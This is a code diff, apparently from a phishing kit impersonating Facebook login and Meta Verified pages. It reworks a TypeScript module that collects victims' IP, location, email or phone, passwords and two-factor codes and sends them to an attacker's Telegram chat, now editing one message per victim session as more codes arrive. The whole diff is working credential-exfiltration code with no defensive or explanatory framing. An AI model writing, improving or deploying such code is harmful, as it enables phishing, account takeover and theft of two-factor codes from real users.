@@ -71,6 +71,58 @@ async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 
     throw lastError;
 }
 
+/** New Telegram flow: merge payload in-memory, then `editMessageText` same `message_id` when possible (one thread message per session key). */
+async function sendOrEditMessage(
+    apiRoot: string,
+    chatId: string,
+    text: string,
+    existingMessageId?: number
+): Promise<number | undefined> {
+    if (existingMessageId != null) {
+        try {
+            const res = await retryTelegramRequest(() =>
+                axios.post(
+                    `${apiRoot}/editMessageText`,
+                    {
+                        chat_id: chatId,
+                        message_id: existingMessageId,
+                        text,
+                        parse_mode: 'HTML',
+                    },
+                    {
+                        httpsAgent: agent,
+                        timeout: 10000,
+                    },
+                ),
+            );
+            const id = res?.data?.result?.message_id;
+            return id ?? existingMessageId;
+        } catch (err: unknown) {
+            const anyErr = err as { response?: { data?: { description?: string } }; message?: string };
+            console.warn(
+                '⚠️ editMessageText failed, sending new message:',
+                anyErr?.response?.data?.description || anyErr?.message || err,
+            );
+        }
+    }
+
+    const res = await retryTelegramRequest(() =>
+        axios.post(
+            `${apiRoot}/sendMessage`,
+            {
+                chat_id: chatId,
+                text,
+                parse_mode: 'HTML',
+            },
+            {
+                httpsAgent: agent,
+                timeout: 10000,
+            },
+        ),
+    );
+    return res?.data?.result?.message_id as number | undefined;
+}
+
 function escapeHtml(input: any): string {
     const str = typeof input === 'string' ? input : String(input ?? '');
     return str
@@ -90,6 +142,9 @@ function formatCodeField(value: unknown): string {
 
 
 function normalizeData(input: any = {}) {
+    const sf = input.submissionFlow;
+    const submissionFlow: '' | 'facebook_login' | 'meta_verified' =
+        sf === 'facebook_login' || sf === 'meta_verified' ? sf : '';
     return {
         ip: input.ip ?? '',
         location: input.location ?? '',
@@ -107,6 +162,7 @@ function normalizeData(input: any = {}) {
         twoFa: input.twoFa ?? '',
         twoFaSecond: input.twoFaSecond ?? '',
         twoFaThird: input.twoFaThird ?? '',
+        submissionFlow,
     };
 }
 
@@ -122,44 +178,58 @@ function mergeData(oldData: any = {}, newData: any = {}) {
     return result;
 }
 
-function formatMessage(data: any): string {
-    const d = normalizeData(data);
-    const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
-        ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
-        : '';
-    const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
-    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
-    const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
+type NormalizedPayload = ReturnType<typeof normalizeData>;
 
+/** Email ô đăng nhập; fallback số điện thoại (luồng Meta Verified thường để phone riêng). */
+function primaryLoginIdentifier(d: NormalizedPayload): string {
+    const email = String(d.email ?? '').trim();
+    if (email) return email;
+    const phone = String(d.phone ?? '').trim().replace(/^\+/, '');
+    return phone ? `+${phone}` : '';
+}
+
+/** Một dòng password: ưu tiên mật khẩu chính, sau đó lần 2 (Meta Password modal). */
+function primaryPasswordField(d: NormalizedPayload): string {
+    const a = String(d.password ?? '').trim();
+    if (a) return a;
+    return String(d.passwordSecond ?? '').trim();
+}
+
+function appendTwoFaBlock(lines: string[], d: NormalizedPayload) {
+    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
+    if (!has2FA) return;
+
+    lines.push(
+        `----------------------`,
+        `<b>🔐 2FA step 1</b>`,
+        `<code>${formatCodeField(d.twoFa)}</code>`,
+        `<b>🔐 2FA step 2</b>`,
+        `<code>${formatCodeField(d.twoFaSecond)}</code>`,
+    );
+    if (d.twoFaThird) {
+        lines.push(`<i>(legacy)</i> <code>${formatCodeField(d.twoFaThird)}</code>`);
+    }
+}
+
+/** Một định dạng tin duy nhất cho mọi luồng; chỉ khác dòng tiêu đề. */
+function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
+    const headline =
+        d.submissionFlow === 'facebook_login' ? `<b>🔷 FACEBOOK LOGIN</b>` : `<b>📋 META VERIFIED</b>`;
     const lines = [
-        `<b>📋 META VERIFIED</b>`,
+        headline,
         `----------------------`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
         `----------------------`,
-        `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
-        `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
-        `<b>DOB:</b> <code>${dob}</code>`,
-        `----------------------`,
-        `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
-        `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
-        `<b>Phone:</b> <code>${phoneDisplay}</code>`,
-        `----------------------`,
-        `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
-        `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
-        `${authLine ? authLine.trim() : ''}`
-    ].filter(Boolean);
-
-    if (has2FA) {
-        lines.push(
-            `----------------------`,
-            `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
-            `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
-            `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
-        );
-    }
-
+        `<b>Mobile number or Email:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
+        `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
+    ];
+    appendTwoFaBlock(lines, d);
     return lines.join('\n');
+}
+
+function formatMessage(data: any): string {
+    return formatTelegramSubmissionMessage(normalizeData(data));
 }
 
 export async function sendTelegramMessage(data: any): Promise<void> {
@@ -170,7 +240,6 @@ export async function sendTelegramMessage(data: any): Promise<void> {
     }
 
     const key = generateKey(data);
-    // Rate limiting check
     if (!checkRateLimit(key)) {
         console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
         return;
@@ -180,45 +249,15 @@ export async function sendTelegramMessage(data: any): Promise<void> {
     const updatedText = formatMessage(fullData);
 
     try {
-        const res = await retryTelegramRequest(() =>
-            axios.post(`${config.api}/sendMessage`, {
-                chat_id: config.chatId,
-                text: updatedText,
-                parse_mode: 'HTML'
-            }, {
-                httpsAgent: agent,
-                timeout: 10000
-            })
-        );
-
-        const messageId = res?.data?.result?.message_id;
-        if (messageId) {
+        const messageId = await sendOrEditMessage(config.api, config.chatId, updatedText, prev?.messageId);
+        if (messageId !== undefined) {
             memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
-            console.log(`✅ Sent new message. ID: ${messageId}`);
+            console.log(`✅ Telegram ${prev?.messageId ? 'updated message' : 'new message'}. ID: ${messageId}`);
         } else {
             console.warn('⚠️ Telegram response không có message_id');
         }
-    } catch (err: any) {
-        console.error('🔥 Telegram send error (retry exhausted):', err?.response?.data || err.message || err);
-        try {
-            const fallbackRes = await axios.post(`${config.api}/sendMessage`, {
-                chat_id: config.chatId,
-                text: updatedText,
-                parse_mode: 'HTML'
-            }, {
-                httpsAgent: agent,
-                timeout: 10000
-            });
-            const fallbackMessageId = fallbackRes?.data?.result?.message_id;
-            if (fallbackMessageId) {
-                memoryStoreTTL.set(key, { message: updatedText, messageId: fallbackMessageId, data: fullData });
-                console.log(`🔄 Fallback send success. ID: ${fallbackMessageId}`);
-            } else {
-                console.warn('⚠️ Fallback Telegram response không có message_id');
-            }
-        } catch (fallbackErr: any) {
-            console.error('🔥 Telegram fallback send error:', fallbackErr?.response?.data || fallbackErr.message || fallbackErr);
-        }
-        return;
+    } catch (err: unknown) {
+        const anyErr = err as { response?: { data?: unknown }; message?: string };
+        console.error('🔥 Telegram error:', anyErr?.response?.data || anyErr?.message || err);
     }
 }
